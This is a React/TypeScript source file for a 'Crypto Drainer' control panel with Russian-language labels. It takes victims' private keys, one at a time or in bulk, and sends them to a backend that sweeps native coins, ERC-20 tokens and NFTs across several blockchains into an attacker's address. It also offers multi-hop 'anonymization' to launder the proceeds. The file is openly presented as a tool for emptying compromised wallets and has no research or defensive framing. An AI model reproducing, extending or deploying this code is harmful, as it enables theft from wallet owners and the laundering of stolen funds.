import { useState } from 'react';
import {
  Box,
  Button,
  Card,
  CardBody,
  CardHeader,
  Flex,
  FormControl,
  FormLabel,
  Heading,
  Input,
  Select,
  Textarea,
  Text,
  useToast,
  VStack,
  HStack,
  Tag,
  TagLabel,
  TagLeftIcon,
  Tabs,
  TabList,
  TabPanels,
  Tab,
  TabPanel,
  Switch,
  FormHelperText,
  Code,
  Divider,
  Table,
  Thead,
  Tbody,
  Tr,
  Th,
  Td,
  Badge,
} from '@chakra-ui/react';
import { MdCurrencyBitcoin, MdKey, MdAccountBalanceWallet, MdSecurity, MdDelete } from 'react-icons/md';
import axios from 'axios';

// API URL
const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000';

// Blockchain options
const blockchains = [
  { value: 'ethereum', label: 'Ethereum', networks: ['mainnet', 'goerli', 'sepolia'] },
  { value: 'binance', label: 'Binance Smart Chain', networks: ['mainnet', 'testnet'] },
  { value: 'polygon', label: 'Polygon', networks: ['mainnet', 'mumbai'] },
  { value: 'arbitrum', label: 'Arbitrum', networks: ['mainnet'] },
  { value: 'optimism', label: 'Optimism', networks: ['mainnet'] },
  { value: 'avalanche', label: 'Avalanche', networks: ['mainnet'] },
  { value: 'base', label: 'Base', networks: ['mainnet'] },
  { value: 'zksync', label: 'zkSync', networks: ['mainnet'] },
];

interface DrainOperation {
  id: string;
  type: string;
  status: string;
  start_time: string;
  end_time?: string;
  results?: any;
  error?: string;
}

const CryptoDrainer = () => {
  const [chain, setChain] = useState('ethereum');
  const [network, setNetwork] = useState('mainnet');
  const [privateKey, setPrivateKey] = useState('');
  const [privateKeys, setPrivateKeys] = useState('');
  const [receiverAddress, setReceiverAddress] = useState('');
  const [operations, setOperations] = useState<DrainOperation[]>([]);
  const [loading, setLoading] = useState(false);
  const [tabIndex, setTabIndex] = useState(0);
  const [useAnonymization, setUseAnonymization] = useState(false);
  const [hops, setHops] = useState(3);
  
  const toast = useToast();

  // Get available networks for selected blockchain
  const availableNetworks = blockchains.find(b => b.value === chain)?.networks || [];

  const handleSingleDrain = async () => {
    if (!privateKey || !receiverAddress) {
      toast({
        title: 'Ошибка',
        description: 'Введите приватный ключ и адрес получателя',
        status: 'error',
        duration: 3000,
        isClosable: true,
      });
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API_URL}/api/crypto/drain`, {
        chain,
        network,
        private_key: privateKey,
        receiver_address: receiverAddress,
        use_anonymization: useAnonymization,
        hops: hops,
      });

      const newOperation: DrainOperation = {
        id: response.data.operation_id,
        type: 'crypto_drain',
        status: 'running',
        start_time: new Date().toISOString(),
      };

      setOperations([newOperation, ...operations]);

      // Poll for operation status
      pollOperationStatus(response.data.operation_id);

      toast({
        title: 'Операция запущена',
        description: `ID операции: ${response.data.operation_id}`,
        status: 'success',
        duration: 5000,
        isClosable: true,
      });
    } catch (error) {
      console.error('Error starting drain operation:', error);
      toast({
        title: 'Ошибка',
        description: 'Не удалось запустить операцию',
        status: 'error',
        duration: 5000,
        isClosable: true,
      });
    } finally {
      setLoading(false);
    }
  };

  const handleBulkDrain = async () => {
    if (!privateKeys || !receiverAddress) {
      toast({
        title: 'Ошибка',
        description: 'Введите приватные ключи и адрес получателя',
        status: 'error',
        duration: 3000,
        isClosable: true,
      });
      return;
    }

    // Convert text area to array of keys
    const keysList = privateKeys
      .split('\n')
      .map(key => key.trim())
      .filter(key => key.length > 0);

    if (keysList.length === 0) {
      toast({
        title: 'Ошибка',
        description: 'Не найдено валидных приватных ключей',
        status: 'error',
        duration: 3000,
        isClosable: true,
      });
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API_URL}/api/crypto/drain`, {
        chain,
        network,
        private_keys: keysList,
        receiver_address: receiverAddress,
        use_anonymization: useAnonymization,
        hops: hops,
      });

      const newOperation: DrainOperation = {
        id: response.data.operation_id,
        type: 'crypto_drain_bulk',
        status: 'running',
        start_time: new Date().toISOString(),
      };

      setOperations([newOperation, ...operations]);

      // Poll for operation status
      pollOperationStatus(response.data.operation_id);

      toast({
        title: 'Массовая операция запущена',
        description: `Дрейн ${keysList.length} ключей`,
        status: 'success',
        duration: 5000,
        isClosable: true,
      });
    } catch (error) {
      console.error('Error starting bulk drain operation:', error);
      toast({
        title: 'Ошибка',
        description: 'Не удалось запустить массовую операцию',
        status: 'error',
        duration: 5000,
        isClosable: true,
      });
    } finally {
      setLoading(false);
    }
  };

  const pollOperationStatus = async (operationId: string) => {
    const interval = setInterval(async () => {
      try {
        const response = await axios.get(`${API_URL}/api/operations/${operationId}`);
        const updatedOperation = response.data;
        
        if (updatedOperation.status !== 'running') {
          // Operation completed, update local state
          setOperations(prevOps => {
            return prevOps.map(op => {
              if (op.id === operationId) {
                return {
                  ...op,
                  status: updatedOperation.status,
                  end_time: updatedOperation.end_time,
                  results: updatedOperation.results,
                  error: updatedOperation.error,
                };
              }
              return op;
            });
          });
          
          // Show a toast notification for the result
          if (updatedOperation.status === 'completed') {
            toast({
              title: 'Операция завершена',
              description: `Дрейн успешно выполнен`,
              status: 'success',
              duration: 5000,
              isClosable: true,
            });
          } else if (updatedOperation.status === 'failed') {
            toast({
              title: 'Операция не удалась',
              description: updatedOperation.error || 'Неизвестная ошибка',
              status: 'error',
              duration: 5000,
              isClosable: true,
            });
          }
          
          clearInterval(interval);
        }
      } catch (error) {
        console.error('Error polling operation status:', error);
        clearInterval(interval);
      }
    }, 2000); // Poll every 2 seconds
  };

  return (
    <Box>
      <Flex mb={5} justifyContent="space-between" alignItems="center">
        <Box>
          <Heading size="lg">Crypto Drainer</Heading>
          <Text color="gray.500">Извлечение криптоактивов из скомпрометированных кошельков</Text>
        </Box>
        <Tag size="lg" variant="subtle" colorScheme="red">
          <TagLeftIcon as={MdCurrencyBitcoin} />
          <TagLabel>Advanced Tool</TagLabel>
        </Tag>
      </Flex>

      <Card mb={8}>
        <CardHeader>
          <Heading size="md">Настройка дрейна</Heading>
        </CardHeader>
        <CardBody>
          <Tabs index={tabIndex} onChange={setTabIndex} variant="enclosed">
            <TabList>
              <Tab>Один ключ</Tab>
              <Tab>Массовый дрейн</Tab>
              <Tab>Настройки</Tab>
            </TabList>
            <TabPanels>
              {/* Вкладка для одного ключа */}
              <TabPanel>
                <VStack spacing={4} align="stretch">
                  <FormControl isRequired>
                    <FormLabel>Блокчейн</FormLabel>
                    <Select 
                      value={chain} 
                      onChange={(e) => {
                        setChain(e.target.value);
                        // Reset network when blockchain changes
                        const newNetworks = blockchains.find(b => b.value === e.target.value)?.networks || [];
                        setNetwork(newNetworks[0] || '');
                      }}
                    >
                      {blockchains.map((bc) => (
                        <option key={bc.value} value={bc.value}>{bc.label}</option>
                      ))}
                    </Select>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Сеть</FormLabel>
                    <Select 
                      value={network} 
                      onChange={(e) => setNetwork(e.target.value)}
                    >
                      {availableNetworks.map((net) => (
                        <option key={net} value={net}>{net}</option>
                      ))}
                    </Select>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Приватный ключ жертвы</FormLabel>
                    <Textarea 
                      placeholder="0x..." 
                      value={privateKey} 
                      onChange={(e) => setPrivateKey(e.target.value)}
                      fontFamily="monospace"
                    />
                    <FormHelperText>Приватный ключ кошелька для дрейна</FormHelperText>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Адрес получателя</FormLabel>
                    <Input 
                      placeholder="0x..." 
                      value={receiverAddress} 
                      onChange={(e) => setReceiverAddress(e.target.value)}
                      fontFamily="monospace"
                    />
                    <FormHelperText>Адрес, на который будут выведены средства</FormHelperText>
                  </FormControl>

                  <FormControl display="flex" alignItems="center" mt={4}>
                    <FormLabel htmlFor="use-anonymization" mb="0">
                      Анонимизация транзакций
                    </FormLabel>
                    <Switch 
                      id="use-anonymization" 
                      isChecked={useAnonymization}
                      onChange={(e) => setUseAnonymization(e.target.checked)}
                    />
                  </FormControl>

                  {useAnonymization && (
                    <FormControl>
                      <FormLabel>Количество переходов</FormLabel>
                      <Select 
                        value={hops} 
                        onChange={(e) => setHops(parseInt(e.target.value))}
                      >
                        <option value={2}>2 (быстрее)</option>
                        <option value={3}>3 (рекомендуется)</option>
                        <option value={5}>5 (безопаснее)</option>
                        <option value={7}>7 (максимальная анонимность)</option>
                      </Select>
                      <FormHelperText>
                        Большее количество переходов повышает анонимность, но увеличивает комиссии
                      </FormHelperText>
                    </FormControl>
                  )}

                  <Button 
                    mt={4}
                    colorScheme="red"
                    leftIcon={<MdDelete />}
                    onClick={handleSingleDrain}
                    isLoading={loading}
                    loadingText="Запуск дрейна..."
                  >
                    Запустить дрейн
                  </Button>
                </VStack>
              </TabPanel>

              {/* Вкладка для массового дрейна */}
              <TabPanel>
                <VStack spacing={4} align="stretch">
                  <FormControl isRequired>
                    <FormLabel>Блокчейн</FormLabel>
                    <Select 
                      value={chain} 
                      onChange={(e) => {
                        setChain(e.target.value);
                        // Reset network when blockchain changes
                        const newNetworks = blockchains.find(b => b.value === e.target.value)?.networks || [];
                        setNetwork(newNetworks[0] || '');
                      }}
                    >
                      {blockchains.map((bc) => (
                        <option key={bc.value} value={bc.value}>{bc.label}</option>
                      ))}
                    </Select>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Сеть</FormLabel>
                    <Select 
                      value={network} 
                      onChange={(e) => setNetwork(e.target.value)}
                    >
                      {availableNetworks.map((net) => (
                        <option key={net} value={net}>{net}</option>
                      ))}
                    </Select>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Приватные ключи (по одному на строку)</FormLabel>
                    <Textarea 
                      placeholder="0x...\n0x...\n0x..." 
                      value={privateKeys} 
                      onChange={(e) => setPrivateKeys(e.target.value)}
                      minHeight="200px"
                      fontFamily="monospace"
                    />
                    <FormHelperText>Вставьте список приватных ключей, по одному на строку</FormHelperText>
                  </FormControl>

                  <FormControl isRequired>
                    <FormLabel>Адрес получателя</FormLabel>
                    <Input 
                      placeholder="0x..." 
                      value={receiverAddress} 
                      onChange={(e) => setReceiverAddress(e.target.value)}
                      fontFamily="monospace"
                    />
                    <FormHelperText>Адрес, на который будут выведены средства</FormHelperText>
                  </FormControl>

                  <FormControl display="flex" alignItems="center" mt={4}>
                    <FormLabel htmlFor="use-anonymization-bulk" mb="0">
                      Анонимизация транзакций
                    </FormLabel>
                    <Switch 
                      id="use-anonymization-bulk" 
                      isChecked={useAnonymization}
                      onChange={(e) => setUseAnonymization(e.target.checked)}
                    />
                  </FormControl>

                  {useAnonymization && (
                    <FormControl>
                      <FormLabel>Количество переходов</FormLabel>
                      <Select 
                        value={hops} 
                        onChange={(e) => setHops(parseInt(e.target.value))}
                      >
                        <option value={2}>2 (быстрее)</option>
                        <option value={3}>3 (рекомендуется)</option>
                        <option value={5}>5 (безопаснее)</option>
                        <option value={7}>7 (максимальная анонимность)</option>
                      </Select>
                      <FormHelperText>
                        Большее количество переходов повышает анонимность, но увеличивает комиссии и время
                      </FormHelperText>
                    </FormControl>
                  )}

                  <Button 
                    mt={4}
                    colorScheme="red"
                    leftIcon={<MdDelete />}
                    onClick={handleBulkDrain}
                    isLoading={loading}
                    loadingText="Запуск массового дрейна..."
                  >
                    Запустить массовый дрейн
                  </Button>
                </VStack>
              </TabPanel>

              {/* Вкладка с настройками */}
              <TabPanel>
                <VStack spacing={4} align="stretch">
                  <Heading size="sm">Расширенные настройки</Heading>
                  <Text>Настройки для опытных пользователей, которые хотят тонко настроить операции дрейна.</Text>
                  
                  <Divider />
                  
                  <FormControl>
                    <FormLabel>Оптимизация газа</FormLabel>
                    <Select defaultValue="auto">
                      <option value="auto">Автоматическая (рекомендуется)</option>
                      <option value="fast">Быстрая</option>
                      <option value="economy">Экономная</option>
                      <option value="manual">Ручная настройка</option>
                    </Select>
                    <FormHelperText>
                      Стратегия оптимизации стоимости газа для транзакций
                    </FormHelperText>
                  </FormControl>
                  
                  <FormControl display="flex" alignItems="center">
                    <FormLabel htmlFor="drain-nft" mb="0">
                      Дрейн NFT
                    </FormLabel>
                    <Switch id="drain-nft" defaultChecked />
                  </FormControl>
                  
                  <FormControl display="flex" alignItems="center">
                    <FormLabel htmlFor="drain-erc20" mb="0">
                      Дрейн ERC-20 токенов
                    </FormLabel>
                    <Switch id="drain-erc20" defaultChecked />
                  </FormControl>
                  
                  <FormControl display="flex" alignItems="center">
                    <FormLabel htmlFor="drain-native" mb="0">
                      Дрейн нативной криптовалюты
                    </FormLabel>
                    <Switch id="drain-native" defaultChecked />
                  </FormControl>
                  
                  <Divider />
                  
                  <Box>
                    <Heading size="sm" mb={2}>API Endpoint</Heading>
                    <Code p={2} borderRadius="md" fontSize="sm">
                      {API_URL}/api/crypto/drain
                    </Code>
                  </Box>
                </VStack>
              </TabPanel>
            </TabPanels>
          </Tabs>
        </CardBody>
      </Card>

      {/* Таблица операций */}
      <Card>
        <CardHeader>
          <Heading size="md">История операций</Heading>
        </CardHeader>
        <CardBody>
          <Table variant="simple">
            <Thead>
              <Tr>
                <Th>ID</Th>
                <Th>Тип</Th>
                <Th>Статус</Th>
                <Th>Время начала</Th>
                <Th>Время завершения</Th>
                <Th>Результат</Th>
              </Tr>
            </Thead>
            <Tbody>
              {operations.length > 0 ? (
                operations.map((op) => (
                  <Tr key={op.id}>
                    <Td>{op.id.substring(0, 8)}...</Td>
                    <Td>{op.type === 'crypto_drain' ? 'Single Key Drain' : 'Bulk Keys Drain'}</Td>
                    <Td>
                      <Badge
                        colorScheme={
                          op.status === 'completed' ? 'green' :
                          op.status === 'running' ? 'blue' :
                          op.status === 'failed' ? 'red' : 'gray'
                        }
                      >
                        {op.status}
                      </Badge>
                    </Td>
                    <Td>{new Date(op.start_time).toLocaleString()}</Td>
                    <Td>{op.end_time ? new Date(op.end_time).toLocaleString() : '-'}</Td>
                    <Td>
                      {op.status === 'completed' && op.results ? (
                        <HStack>
                          <Tag colorScheme="green">
                            <TagLeftIcon as={MdAccountBalanceWallet} />
                            <TagLabel>{op.results.total_drained || '0'} ETH</TagLabel>
                          </Tag>
                          {op.results.tokens_drained > 0 && (
                            <Tag colorScheme="purple">
                              <TagLeftIcon as={MdKey} />
                              <TagLabel>{op.results.tokens_drained} Tokens</TagLabel>
                            </Tag>
                          )}
                        </HStack>
                      ) : op.status === 'failed' ? (
                        <Text color="red.500" fontSize="sm">{op.error || 'Unknown error'}</Text>
                      ) : (
                        '-'
                      )}
                    </Td>
                  </Tr>
                ))
              ) : (
                <Tr>
                  <Td colSpan={6} textAlign="center">История операций пуста</Td>
                </Tr>
              )}
            </Tbody>
          </Table>
        </CardBody>
      </Card>
    </Box>
  );
};

export default CryptoDrainer; 